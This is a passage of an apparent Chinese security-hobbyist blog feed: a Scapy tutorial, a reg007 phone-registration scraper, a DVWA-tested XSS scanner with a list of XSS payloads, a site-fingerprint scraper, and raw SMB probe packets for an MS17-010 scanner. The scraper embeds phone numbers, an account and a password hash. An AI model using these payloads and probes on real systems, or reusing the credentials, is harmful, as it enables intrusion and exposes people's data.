 SMBNegociate_Protocol_Response_Advanced_Security : SMBNegociate Protocol Response Advanced Security    SMBNegociate_Protocol_Response_No_Security : SMBNegociate Protocol Response No Security    SMBNegociate_Protocol_Response_No_Security_No_Key : None    SMBNetlogon_Protocol_Response_Header : SMBNetlogon Protocol Response Header    SMBNetlogon_Protocol_Response_Tail_LM20 : SMB Netlogon Protocol Response Tail LM20    SMBNetlogon_Protocol_Response_Tail_SAM : SMB Netlogon Protocol Response Tail SAM    SMBSession_Setup_AndX_Request : Session Setup AndX Request    SMBSession_Setup_AndX_Response : Session Setup AndX Response    SM_Confirm : Pairing Confirm    SM_Encryption_Information : Encryption Information    SM_Failed  : Pairing Failed    SM_Hdr     : SM header    SM_Identity_Address_Information : Identity Address Information    SM_Identity_Information : Identity Information    SM_Master_Identification : Master Identification    SM_Pairing_Request : Pairing Request    SM_Pairing_Response : Pairing Response    SM_Random  : Pairing Random    SM_Signing_Information : Signing Information    SNAP       : SNAP    SNMP       : None    SNMPbulk   : None    SNMPget    : None    SNMPinform : None    SNMPnext   : None    SNMPresponse : None    SNMPset    : None    SNMPtrapv1 : None    SNMPtrapv2 : None    SNMPvarbind : None    STP        : Spanning Tree Protocol    Skinny     : Skinny    TCP        : TCP    TCPerror   : TCP in ICMP    TFTP       : TFTP opcode    TFTP_ACK   : TFTP Ack    TFTP_DATA  : TFTP Data    TFTP_ERROR : TFTP Error    TFTP_OACK  : TFTP Option Ack    TFTP_Option : None    TFTP_Options : None    TFTP_RRQ   : TFTP Read Request    TFTP_WRQ   : TFTP Write Request    UDP        : UDP    UDPerror   : UDP in ICMP    USER_CLASS_DATA : user class data    VENDOR_CLASS_DATA : vendor class data    VENDOR_SPECIFIC_OPTION : vendor specific option data    VRRP       : None    VRRPv3     : None    VXLAN      : VXLAN    X509_AccessDescription : None    X509_AlgorithmIdentifier : None    X509_Attribute : None    X509_AttributeTypeAndValue : None    X509_AttributeValue : None    X509_CRL   : None    X509_Cert  : None    X509_DNSName : None    X509_DirectoryName : None    X509_EDIPartyName : None    X509_ExtAuthInfoAccess : None    X509_ExtAuthorityKeyIdentifier : None    X509_ExtBasicConstraints : None    X509_ExtCRLDistributionPoints : None    X509_ExtCRLNumber : None    X509_ExtCertificateIssuer : None    X509_ExtCertificatePolicies : None    X509_ExtComment : None    X509_ExtDefault : None    X509_ExtDeltaCRLIndicator : None    X509_ExtDistributionPoint : None    X509_ExtDistributionPointName : None    X509_ExtExtendedKeyUsage : None    X509_ExtFreshestCRL : None    X509_ExtFullName : None    X509_ExtGeneralSubtree : None    X509_ExtInhibitAnyPolicy : None    X509_ExtInvalidityDate : None    X509_ExtIssuerAltName : None    X509_ExtIssuingDistributionPoint : None    X509_ExtKeyUsage : None    X509_ExtNameConstraints : None    X509_ExtNameRelativeToCRLIssuer : None    X509_ExtNetscapeCertType : None    X509_ExtNoticeReference : None    X509_ExtPolicyConstraints : None    X509_ExtPolicyInformation : None    X509_ExtPolicyMappings : None    X509_ExtPolicyQualifierInfo : None    X509_ExtPrivateKeyUsagePeriod : None    X509_ExtQcStatement : None    X509_ExtQcStatements : None    X509_ExtReasonCode : None    X509_ExtSubjInfoAccess : None    X509_ExtSubjectAltName : None    X509_ExtSubjectDirectoryAttributes : None    X509_ExtSubjectKeyIdentifier : None    X509_ExtUserNotice : None    X509_Extension : None    X509_Extensions : None    X509_GeneralName : None    X509_IPAddress : None    X509_OtherName : None    X509_PolicyMapping : None    X509_RDN   : None    X509_RFC822Name : None    X509_RegisteredID : None    X509_RevokedCertificate : None    X509_SubjectPublicKeyInfo : None    X509_TBSCertList : None    X509_TBSCertificate : None    X509_URI   : None    X509_Validity : None    X509_X400Address : None    _DHCP6OptGuessPayload : None    _DNSRRdummy : Dummy class that implements post_build() for Resource Records    _ESPPlain  : ESP    _ICMPv6    : ICMPv6 dummy class    _ICMPv6Error : ICMPv6 errors dummy class    _ICMPv6ML  : ICMPv6 dummy class    _IPOption_HDR : None    _IPv46     : IP    _IPv6ExtHdr : Abstract IPv6 Option Header    _LLMNR     : None    _MobilityHeader : Dummy IPv6 Mobility Header    _RadiusAttrHexStringVal : Radius Attribute    _RadiusAttrIPv4AddrVal : Radius Attribute    _RadiusAttrIntEnumVal : Radius Attribute    _RadiusAttrIntValue : Radius Attribute    _SpecificRadiusAttr : Radius Attribute    None</code></pre><p>查看支持的指令集</p><pre><code>from scapy.all import *print(lsc())</code></pre><p><img src="https://i.imgur.com/SDo5V1G.png" alt=""></p><pre><code>IPID_count          : Identify IP id values classes in a list of packetsarpcachepoison      : Poison target&#39;s cache with (your MAC,victim&#39;s IP) couplearping              : Send ARP who-has requests to determine which hosts are upbind_layers         : Bind 2 layers on some specific fields&#39; valuesbridge_and_sniff    : Forward traffic between interfaces if1 and if2, sniff and returnchexdump            :  Build a per byte hexadecimal representationcomputeNIGroupAddr  : Compute the NI group Address. Can take a FQDN as input parametercorrupt_bits        : Flip a given percentage or number of bits from a stringcorrupt_bytes       : Corrupt a given percentage or number of bytes from a stringdefrag              : defrag(plist) -&gt; ([not fragmented], [defragmented],defragment          : defrag(plist) -&gt; plist defragmented as much as possible dhcp_request        : --dyndns_add          : Send a DNS add message to a nameserver for &quot;name&quot; to have a new &quot;rdata&quot;dyndns_del          : Send a DNS delete message to a nameserver for &quot;name&quot;etherleak           : Exploit Etherleak flawfletcher16_checkbytes:  Calculates the Fletcher-16 checkbytes returned as 2 byte binary-string.fletcher16_checksum :  Calculates Fletcher-16 checksum of the given buffer.fragleak            : --fragleak2           : --fragment            : Fragment a big IP datagramfuzz                : Transform a layer into a fuzzy layer by replacing some default values by random objectsgetmacbyip          : Return MAC address corresponding to a given IP addressgetmacbyip6         : Returns the MAC address corresponding to an IPv6 addresshexdiff             : Show differences between 2 binary stringshexdump             :  Build a tcpdump like hexadecimal viewhexedit             : --hexstr              : --import_hexcap       : --is_promisc          : Try to guess if target is in Promisc mode. The target is provided by its ip.linehexdump         :  Build an equivalent view of hexdump() on a single linels                  : List  available layers, or infos on a given layer class or nameneighsol            : Sends an ICMPv6 Neighbor Solicitation message to get the MAC address of the neighbor with specified IPv6 address addroverlap_frag        : Build overlapping fragments to bypass NIPSpromiscping         : Send ARP who-has requests to determine which hosts are in promiscuous moderdpcap              : Read a pcap or pcapng file and return a packet listreport_ports        : portscan a target and output a LaTeX tablerestart             : Restarts scapysend                : Send packets at layer 3sendp               : Send packets at layer 2sendpfast           : Send packets at layer 2 using tcpreplay for performancesniff               : split_layers        : Split 2 layers previously boundsr                  : Send and receive packets at layer 3sr1                 : Send packets at layer 3 and return only the first answersr1flood            : Flood and receive packets at layer 3 and return only the first answersrbt                : send and receive using a bluetooth socketsrbt1               : send and receive 1 packet using a bluetooth socketsrflood             : Flood and receive packets at layer 3srloop              : Send a packet at layer 3 in loop and print the answer each timesrp                 : Send and receive packets at layer 2srp1                : Send and receive packets at layer 2 and return only the first answersrp1flood           : Flood and receive packets at layer 2 and return only the first answersrpflood            : Flood and receive packets at layer 2srploop             : Send a packet at layer 2 in loop and print the answer each timetcpdump             : Run tcpdump or tshark on a list of packetstraceroute          : Instant TCP traceroutetraceroute6         : Instant TCP traceroute using IPv6traceroute_map      : Util function to call traceroute on multiple targets, thentshark              : Sniff packets and print them calling pkt.summary(), a bit like text wiresharkwireshark           : Run wireshark on a list of packetswrpcap              : Write a list of packets to a pcap fileNone</code></pre><p>arping得到所在局域网内所有可用的ip与mac的对应关系</p><pre><code>from scapy.all import *print(arping(&quot;192.168.89.255/80&quot;))</code></pre><p><img src="https://i.imgur.com/FXMIyan.png" alt=""></p><pre><code>Begin emission:Finished sending 1 packets.Received 0 packets, got 0 answers, remaining 1 packets(&lt;ARPing: TCP:0 UDP:0 ICMP:0 Other:0&gt;, &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:1&gt;)</code></pre><p>携带参数模式</p><pre><code>from scapy.all import *print(ls(UDP))</code></pre><p><img src="https://i.imgur.com/jQujPUM.png" alt=""></p><pre><code>sport      : ShortEnumField                      = (53)dport      : ShortEnumField                      = (53)len        : ShortField                          = (None)chksum     : XShortField                         = (None)None</code></pre><p><strong>IP模块的使用：</strong><br>我们可以实例化一个IP对象<br><img src="https://i.imgur.com/JsfJ1pB.png" alt=""><br>也可以传入需要自定义的参数<br><img src="https://i.imgur.com/4oQX6H5.png" alt=""><br>查看 IP 模块对象的所有信息<br><img src="https://i.imgur.com/kerW2wG.png" alt=""><br><strong>发送报文：</strong><br><img src="https://i.imgur.com/F6nCWBR.png" alt=""><br><strong>接收报文：</strong><br>测试：<br>开启两个终端,一边发送报文一边接收报文<br><img src="https://i.imgur.com/A1PJRMm.png" alt=""></p><p><strong>细说数据发送：</strong><br>send在第三层发送数据包，但没有接收功能<br><img src="https://i.imgur.com/JkZaTa9.png" alt=""></p><p>向某个IP发送一个数据包：</p><pre><code>import structfrom scapy.all import *data = struct.pack(&#39;=BHI&#39;, 0x13, 0x5EF3, 0x96)pkt = IP(src=&#39;127.0.0.1&#39;, dst=&#39;127.0.0.1&#39;)/UDP(sport=12345,dport=5555)/datasend(pkt, inter=1, count=5)</code></pre><p><img src="https://i.imgur.com/k8ZBF0Q.png" alt=""></p><p>在第二层发送数据包，同样没有接收功能。</p><pre><code>import structfrom scapy.all import *dar=sendp(Ether()/IP(dst=&quot;www.baidu.com&quot;,ttl=4)/ICMP())print(dar)</code></pre><p><img src="https://i.imgur.com/FoaZGrM.png" alt=""></p><p>sr在第三层发送数据包，有接收功能</p><p><img src="https://i.imgur.com/XHsj3Hq.png" alt=""></p><p>sr1在第三层发送数据包，有接收功能，但只接收第一个包<br><img src="https://i.imgur.com/Y7GOUL2.png" alt=""></p><p>srloop在第三层工作<br><img src="https://i.imgur.com/BKt1Chw.png" alt=""><br>srp在第二层发送数据包，有接收功能<br><img src="https://i.imgur.com/KCuNS3U.png" alt=""><br>srp1在第二层发送数据包，有接收功能，但只接收第一个包。以上面的发送四个包为例</p><p><img src="https://i.imgur.com/3bNMq7Q.png" alt=""><br>srploop在第三层工作<br><img src="https://i.imgur.com/cn5rcKX.png" alt=""></p><p>好了，到现在我们已经详细的认识了scapy的一部分功能。也细说了发送的功能。下次我们在学习，去看漏洞银行七夕直播了<br>转载请声明：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>抓取reg007的过程</title>
      <link href="/posts/9f4ca7bb.html"/>
      <url>/posts/9f4ca7bb.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前有那么一丝想抓取一个Reg007网站的想法，但是之前因为<br>上学没有时间。所以没抓</p><p><img src="https://i.imgur.com/EuUIzvh.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p><img src="https://i.imgur.com/LjWPxZx.png" alt=""></p><p>Reg007是一个可以查到，你手机号注册了什么网站的一个站。<br>我们不登陆的话可以查询到三个注册过的网站。</p><p><img src="https://i.imgur.com/NGKThwI.png" alt=""></p><p>那么我们来抓包一次看看到底是怎么回事</p><p><img src="https://i.imgur.com/rHgJO1W.png" alt=""></p><p>从这里我们可以看出这里的抓到的请求，请求参数为</p><pre><code>q：你的手机号码</code></pre><p>然后需要在cookie带上你手机号发送：</p><pre><code>_ga=GA1.2.1107102936.1534170998; _gid=GA1.2.1501069481.1534324705; reg007_c_s_t=2; reg007_think_language=zh-CN; PHPSESSID=gtnua8rhph3d80u3umktadimk6; reg007_f_c_j=958dcf85640ae27962c2c9f9cd00574f; reg007_q=手机号</code></pre><p>然后我们登陆账号在试试查询</p><p><img src="https://i.imgur.com/bvC2KyZ.png" alt=""></p><p>可以看出用了登陆cookie之后我们能查到全部。（我草码又没打好<br>不打了草）</p><p>思路：</p><pre><code>1.首先进行登陆2.然后抓取登陆的cookie进行查询</code></pre><p>代码：（烂的一匹，死活不知道怎么获取Request Cookie）</p><pre><code>import requestsimport reimport timefrom bs4 import BeautifulSoupdef reg():    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#39;}    url=&#39;https://www.reg007.com/&#39;    loginurl=&#39;https://www.reg007.com/account/signin&#39;    sous=&#39;https://www.reg007.com/search?q=查询的手机号&#39;    zq=requests.get(url=url,headers=headers)    search=re.search(&#39;value=&quot;.*&quot;&#39;,zq.text)    qz=str(search.group()).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;value&#39;,&#39;&#39;)    cs=&#39;account=你的账号&amp;password=你的密码&amp;remember=on&amp;__csrf__{}&#39;.format(qz)    datas={}    cookies={}    cookiev=&#39;_ga=GA1.2.1107102936.1534170998; _gid=GA1.2.1501069481.1534324705; reg007_c_s_t=2; reg007_q=13113190031; reg007_account=18938561951; reg007_password=86e6a966a434f11cfa0ad215d1eaa8b0; reg007_think_language=zh-CN; PHPSESSID=jt6c1djpm2ep7qnte3d1svuen4; _gat=1&#39;    for c in cs.split(&#39;&amp;&#39;):        key,value=c.split(&#39;=&#39;,1)        datas[key]=value    for k in cookiev.split(&#39;;&#39;):        key,value=k.split(&#39;=&#39;,1)        cookies[key]=value    #print(zq.headers)    hq=requests.get(url=loginurl,headers=headers)    reqts=requests.session()    login=reqts.post(url=loginurl,headers=headers,data=datas,cookies=cookies)    if login.url == &#39;https://www.reg007.com/account&#39;:        print(&#39;[+]Landing success !&#39;)        cv= {}        cookiesw=&#39;_ga=GA1.2.1107102936.1534170998; _gid=GA1.2.1501069481.1534324705; reg007_c_s_t=2; reg007_think_language=zh-CN; PHPSESSID=gtnua8rhph3d80u3umktadimk6; reg007_f_c_j=958dcf85640ae27962c2c9f9cd00574f; reg007_q=13113190031; reg007_account=18938561951; reg007_password=86e6a966a434f11cfa0ad215d1eaa8b0&#39;        for u in cookiesw.split(&#39;;&#39;):            key,value=u.split(&#39;=&#39;,1)            cv[key]=value        dw = reqts.get(url=sous, headers=headers,cookies=cv)        time.sleep(5)        kivs = BeautifulSoup(dw.text, &#39;html.parser&#39;)        fd=re.findall(&#39;.*\|&#39;,kivs.get_text())        for f in fd:            print(str(f).replace(&#39;(&#39;,&#39;&#39;).replace(&#39;adsbygoogle&#39;,&#39;&#39;).replace(&#39;=&#39;,&#39;&#39;).replace(&#39;window&#39;,&#39;&#39;).replace(&#39;.&#39;,&#39;&#39;).replace(&#39;||&#39;,&#39;&#39;).replace(&#39;functioni&#39;,&#39;&#39;).replace(&#39;s&#39;,&#39;&#39;).replace(&#39;o&#39;,&#39;&#39;).replace(&#39;g&#39;,&#39;&#39;).replace(&#39;r&#39;,&#39;&#39;).replace(&#39;a&#39;,&#39;&#39;).replace(&#39;,&#39;,&#39;&#39;).replace(&#39;m&#39;,&#39;&#39;).replace(&#39;{&#39;,&#39;&#39;).replace(&#39;i&#39;,&#39;&#39;).replace(&#39;[&#39;,&#39;&#39;).replace(&quot;&#39;&quot;,&#39;&#39;).replace(&#39;)&#39;,&#39;&#39;).replace(&#39;GleAnlytcObject&#39;,&#39;&#39;).replace(&#39;]&#39;,&#39;&#39;).replace(&#39;;&#39;,&#39;&#39;).replace(&#39;q&#39;,&#39;&#39;))            #print(f)    else:        print(&#39;[-]Landing failure !&#39;)        exit()#gz=requests.get(url=url,headers=headers)#PHPSESSID=gz.cookies#search2=re.search(&#39;PHPSESSID=.*&#39;,str(PHPSESSID))#PHPSESSID=str(search2).replace(&#39;&lt;&#39;,&#39;&#39;).replace(&#39;_&#39;,&#39;&#39;).replace(&#39;sre&#39;,&#39;&#39;).replace(&#39;.&#39;,&#39;&#39;).replace(&#39;SREMatch&#39;,&#39;&#39;).replace(&#39;object&#39;,&#39;&#39;).replace(&#39;;&#39;,&#39;&#39;).replace(&#39;span=&#39;,&#39;&#39;).replace(&#39;(&#39;,&#39;&#39;).replace(&#39;27&#39;,&#39;&#39;).replace(&#39;,&#39;,&#39;&#39;).replace(&#39;162&#39;,&#39;&#39;).replace(&#39;)&#39;,&#39;&#39;).replace(&#39;match=&#39;,&#39;&#39;).replace(&#39;for&#39;,&#39;&#39;).replace(&#39;wwwreg0&#39;,&#39;&#39;).replace(&#39;&gt;&#39;,&#39;&#39;).replace(&quot;&#39;&quot;,&#39;&#39;).strip()#COOKIES=&#39;reg007_think_language=zh-CN;{};reg007_c_s_t=1; reg007_account=18938561951;reg007_password={}&#39;.format(PHPSESSID)#cas={}#cks=&#39;Cookie: reg007_think_language=zh-CN; PHPSESSID=evtmr498kqegclhchh3etkqv27; reg007_c_s_t=1; reg007_account=18938561951; reg007_password=86e6a966a434f11cfa0ad215d1eaa8b0; reg007_q=13113190031; reg007_f_c_j=acca75fee2492ffacbc22c9640bca829; _ga=GA1.2.714340125.1534326028; _gid=GA1.2.519570063.1534326028&#39;#for l in cks.split(&#39;;&#39;):    #key,value=l.split(&#39;=&#39;,1)    #cas[key]=valuereg()</code></pre><p>效果还是那么烂：<br><img src="https://i.imgur.com/OqYlj1H.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>写个xss检测器怎么样</title>
      <link href="/posts/6be20071.html"/>
      <url>/posts/6be20071.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前言都写了好多次了，都不知道写什么了。。。就是之前已经写了SQL注入的检测了。顺便把xss检测写了<br><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=1794900033,2842336697&amp;fm=15&amp;gp=0.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>为了进行测试，首先搭建DVWA环境。这里我用Ubuntu搭建的<br>搭建环境这里我就不说了。<br><strong>漏洞说明：</strong></p><pre><code>xss漏洞（跨站脚本注入漏洞）攻击者将恶意的JavaScript代码注入到页面发起恶意攻击当注入成功的时候页面会有注入成功的语句</code></pre><p><strong>代码思路：</strong></p><pre><code>1.首先遍历存放xss payload的文件夹，进行读取2.让使用者输入URL并要在指定插入xss payload的地方插入*3.替换*为xss的payload4.检测页面是否有注入成功的xss payload5.将注入成功的语句写入一个txt里</code></pre><p>代码：</p><pre><code>import requestsimport osimport redef scan():    xj = open(&#39;save.txt&#39;, &#39;w&#39;)    xj.close()    headers = {&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#39;}    cookies={}    user=input(&#39;url:&#39;)    cookier=input(&#39;cookie:&#39;)    for c in cookier.split(&#39;;&#39;):        key,value=c.split(&#39;=&#39;,1)        cookies[key]=value    print(cookies)    print(&#39;[*]{}&#39;.format(user))    dq = os.listdir(&#39;xss_payload&#39;)    for line in dq:        print(&#39;[+]{}&#39;.format(line))        ds = open(&#39;xss_payload/{}&#39;.format(line),&#39;r&#39;)        for we in ds.readlines():            #print(we)            qc=&#39;&#39;.join(we.split(&#39;\n&#39;))            th=user.replace(&#39;*&#39;,&#39;{}&#39;.format(qc))            try:                rest=requests.session()                livs=rest.get(url=th,headers=headers,cookies=cookies)                if qc in livs.text:                    print(&#39;[+]xss payload:{}{}&#39;.format(livs.url,qc))                    print(&#39;[+]xss payload:{}{}&#39;.format(livs.url, qc),file=open(&#39;save.txt&#39;,&#39;a&#39;))                else:                    print(&#39;[-]Not xss payload:{}&#39;.format(qc))            except Exception as r:                print(&#39;[-]Error {}&#39;.format(r))scan()</code></pre><p>DVWA低级到高级的测试：<br>（不可能级别将字符实体化已经不存在xss漏洞）</p><p>low级：<br><img src="https://i.imgur.com/WIq2zh2.png" alt=""></p><p><img src="https://i.imgur.com/fROnc2q.png" alt=""></p><p><img src="https://i.imgur.com/5VZEJHo.png" alt=""></p><p><img src="https://i.imgur.com/G1mKsVr.png" alt=""></p><p>随便找个Payload来测试一下：<br><img src="https://i.imgur.com/3XQvlRI.png" alt=""></p><p>Medium级：<br><img src="https://i.imgur.com/QUlr9sT.png" alt=""></p><p><img src="https://i.imgur.com/EBQqVdG.png" alt=""></p><p><img src="https://i.imgur.com/e7pfFcm.png" alt=""></p><p><img src="https://i.imgur.com/sk6gMIG.png" alt=""></p><p>随便找个 payload来测试下：<br><img src="https://i.imgur.com/8b0BX5E.png" alt=""></p><p><img src="https://i.imgur.com/5EfPuns.png" alt=""></p><p>high级：<br><img src="https://i.imgur.com/Pr6f1gY.png" alt=""></p><p><img src="https://i.imgur.com/DA4ySjz.png" alt=""></p><p><img src="https://i.imgur.com/yMr49wY.png" alt=""></p><p><img src="https://i.imgur.com/dU8jDkQ.png" alt=""><br>随便找个payload：<br><img src="https://i.imgur.com/oW3YRt7.png" alt=""></p><p>收集到的payload古灵精怪的，有一些不只是弹窗。<br>一些常用的手动xss测试语句：</p><pre><code>javascript:alert(1)//INJECTX&lt;svg/onload=alert(1)&gt;//INJECTX&lt;img onload=alert(1)&gt;//INJECTX&lt;img src=x onerror=prompt(1)&gt;//INJECTX&lt;a href=&quot;javascript:alert(1)&quot; onmouseover=alert(1)&gt;INJECTX HOVER&lt;/a&gt; onmouseover=&quot;document.cookie=true;&quot;&gt;//INJECTXalert(1)&gt;//INJECTX&lt;h1&gt;INJECTX&lt;/h1&gt;&lt;img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)&gt;&lt;svg&gt;&lt;script&gt;/&lt;@/&gt;alert(1)&lt;/script&gt;//INJECTX&lt;svg/onload=alert(/INJECTX/)&gt;&lt;iframe/onload=alert(/INJECTX/)&gt;&lt;svg/onload=alert`INJECTX`&gt;&lt;svg/onload=alert(/INJECTX/)&gt;&lt;svg/onload=alert(`INJECTX`)&gt;}alert(/INJECTX/);{//&lt;h1/onclick=alert(1)&gt;a//INJECTX&lt;svg/onload=alert(/INJECTX/)&gt;&lt;p/onclick=alert(/INJECTX/)&gt;a&lt;svg/onload=alert`INJECTX`&gt;&lt;svg/onload=alert(/INJECTX/)&gt;&lt;svg/onload=alert(`INJECTX`)&gt;&lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;//INJECTX&lt;video onerror=&quot;javascript:alert(1)&quot;&gt;&lt;source&gt;//INJECTX&lt;audio onerror=&quot;javascript:alert(1)&quot;&gt;&lt;source&gt;//INJECTX&lt;input autofocus onfocus=alert(1)&gt;//INJECTX&lt;select autofocus onfocus=alert(1)&gt;//INJECTX&lt;textarea autofocus onfocus=alert(1)&gt;//INJECTX&lt;keygen autofocus onfocus=alert(1)&gt;//INJECTX&lt;button form=test onformchange=alert(1)&gt;//INJECTX&lt;form&gt;&lt;button formaction=&quot;javascript:alert(1)&quot;&gt;//INJECTX&lt;svg onload=(alert)(1) &gt;//INJECTX&lt;script&gt;$=1,alert($)&lt;/script&gt;//INJECTX&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;//INJECTX&lt;img/src=&#39;x&#39;onerror=alert(1)&gt;//INJECTX&lt;marguee/onstart=alert(1)&gt;//INJECTX&lt;script&gt;alert(1)//INJECTX&lt;script&gt;alert(1)&lt;!--INJECTX&lt;marquee loop=1 width=0 onfinish=alert(1)&gt;//INJECTX</code></pre><p>xss万能注入语句：<a href="https://www.jianshu.com/p/3f16269c83db" target="_blank" rel="noopener">https://www.jianshu.com/p/3f16269c83db</a><br>转载请声明：专自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>抓取云悉接口</title>
      <link href="/posts/10d57181.html"/>
      <url>/posts/10d57181.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前段时间一直想抓web指纹，发现手动抓的残缺不全还不准确。后来想抓云悉<br>指纹没有做。现在正好有时间爬了。<br><img src="https://i.imgur.com/AE9yFBG.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>我们首先来抓包，分析一下URL<br>云悉：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></p><p><img src="https://i.imgur.com/LXEWIFX.png" alt=""></p><p>有type,url,string,_token。这几个参数</p><pre><code>通查看网页源代码可以得出，string的参数是固定的。而_token是可以从网页源代码获取的。url是你自己的type是cms查询的类型，还有一个查whois的</code></pre><p>然后可以得出思路：</p><pre><code>1.利用正则的search搜索功能抓取_token2.过滤掉_token一些无关紧要的符合3.组成参数4.经过循环并且加入字典5.发送post请求并带上参数6.解刨json数据</code></pre><p>代码：</p><pre><code>import requestsimport threadingimport redef zhuaq(urls):user=input(&#39;url:&#39;)data={}data2={}headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#39;}url2=&#39;http://www.yunsee.cn/home/getInfo&#39;reqts=requests.get(url=urls,headers=headers)search=re.search(&#39;_token:.*&#39;,reqts.text)token=&#39;{}&#39;.format(search.group()).replace(&#39;}&#39;,&#39;&#39;).replace(&#39;,&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;:&#39;,&#39;&#39;).replace(&#39;_token&#39;,&#39;&#39;).strip()datas=&#39;type=webcms&amp;url={}&amp;_token={}&#39;.format(user,token)datas2 = &#39;type=webinfo&amp;url={}&amp;_token={}&#39;.format(user, token)for v in datas.split(&#39;&amp;&#39;):    key,value=v.split(&#39;=&#39;,1)    data[key]=valuereqvs=requests.post(url=url2,headers=headers,data=data)jsons=reqvs.json()for v in datas2.split(&#39;&amp;&#39;):    key, value = v.split(&#39;=&#39;, 1)    data2[key] = valuereqvs2 = requests.post(url=url2, headers=headers, data=data2)json2=reqvs2.json()print(&#39;url:{}&#39;.format(user))print(&#39;whois_dns:{}&#39;.format(json2[&#39;res&#39;][&#39;whois_dns&#39;]))print(&#39;icp_name:{}&#39;.format(json2[&#39;res&#39;][&#39;icp_name&#39;]))print(&#39;ip:{}&#39;.format(json2[&#39;res&#39;][&#39;ip&#39;]))print(&#39;language:{}&#39;.format(json2[&#39;res&#39;][&#39;language&#39;]))print(&#39;whois_mail:{}&#39;.format(json2[&#39;res&#39;][&#39;whois_mail&#39;]))print(&#39;os:{}&#39;.format(json2[&#39;res&#39;][&#39;os&#39;]))print(&#39;cdn:{}&#39;.format(json2[&#39;res&#39;][&#39;cdn&#39;]))print(&#39;server:{}&#39;.format(json2[&#39;res&#39;][&#39;server&#39;]))print(&#39;record_id:{}&#39;.format(json2[&#39;res&#39;][&#39;record_id&#39;]))print(&#39;whois_isp:{}&#39;.format(json2[&#39;res&#39;][&#39;whois_isp&#39;]))#print(&#39;LLC:{}&#39;.format(json2[&#39;res&#39;][&#39;LLC&#39;]))print(&#39;whois_date:{}&#39;.format(json2[&#39;res&#39;][&#39;whois_date&#39;]))print(&#39;create:{}&#39;.format(json2[&#39;res&#39;][&#39;create&#39;]))print(&#39;icp_id:{}&#39;.format(json2[&#39;res&#39;][&#39;icp_id&#39;]))print(&#39;whois_name:{}&#39;.format(json2[&#39;res&#39;][&#39;whois_name&#39;]))print(&#39;idc:{}&#39;.format(json2[&#39;res&#39;][&#39;idc&#39;]))print(&#39;cms:{}&#39;.format(jsons[&#39;mess&#39;]))for reqs in jsons[&#39;res&#39;][0:]:    print(&#39;desc:{} name:{}&#39;.format(reqs[&#39;desc&#39;],reqs[&#39;name&#39;]))def run():    url = &#39;http://www.yunsee.cn/&#39;    t=threading.Thread(target=zhuaq,args=(url,))    t.start()if __name__ == &#39;__main__&#39;:    run()</code></pre><p>测试效果图：<br><img src="https://i.imgur.com/74eBaKb.png" alt=""></p><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python写MS17-010扫描器</title>
      <link href="/posts/c68019ec.html"/>
      <url>/posts/c68019ec.html</url>
      <content type="html"><![CDATA[<p>前言：<br>MS17-010早已是上一年的事情了。只不过想写一个检测脚本方便自己进行测试和用<br><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=1136046643,4023666134&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文:"></a>正文:</h2><p>先说思路：</p><pre><code>    negotiate_protocol_request = binascii.unhexlify(    &quot;00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&quot;)session_setup_request = binascii.unhexlify(    &quot;00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000&quot;)tree_connect_request = binascii.unhexlify(    &quot;00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00&quot;)trans2_session_setup = binascii.unhexlify(    &quot;0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000&quot;)</code></pre><p>1.先把这些payload(首先把payload进行字符化)发送到目标主机<br>2.然后读取返回的数据进行判断<br>3.验证是否存在MS17010漏洞</p><p>代码：</p><pre><code>import socketimport binasciiimport structimport 